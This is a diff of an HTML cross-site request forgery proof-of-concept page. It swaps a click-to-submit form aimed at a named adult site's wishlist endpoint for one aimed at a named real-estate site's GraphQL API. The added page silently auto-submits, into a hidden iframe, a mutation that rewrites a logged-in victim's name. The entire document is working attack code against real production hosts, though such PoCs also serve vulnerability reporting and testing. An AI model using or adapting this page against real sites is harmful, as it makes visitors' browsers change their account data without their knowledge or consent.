@@ -1,12 +1,21 @@
+<!doctype html>
 <html>
+<head><meta charset="utf-8"><title>CSRF PoC - form fallback</title></head>
 <body>
-<h3>Click the button to trigger the CSRF request silently.</h3>
+<h3>CSRF PoC (form fallback) — auto-submit</h3>
 
-<form action="https://www.mydirtyhobby.com/wishlist/manage/item/12257661/1/videoplayer" method="POST">
-    <button type="submit">Trigger Wishlist Change</button>
+<form id="poc" action="https://mexa.realestate.com.au/graphql" method="POST" enctype="application/x-www-form-urlencoded" target="hidden_iframe">
+  <!-- Many GraphQL servers accept 'query' and 'variables' as form fields -->
+  <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: personalDetailsInput!) { updatePersonalDetails(input: $input) { firstName lastName __typename } }'>
+  <input type="hidden" name="variables" value='{"input":{"firstName":"admin","lastName":"nalla"}}'>
+  <button type="submit">Submit</button>
 </form>
 
-<p><i>Victim's wishlist will be modified if logged in.</i></p>
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
+<script>
+  // auto-submit after a short delay (mimic user visit)
+  setTimeout(()=>document.getElementById('poc').submit(), 500);
+</script>
 </body>
 </html>
-
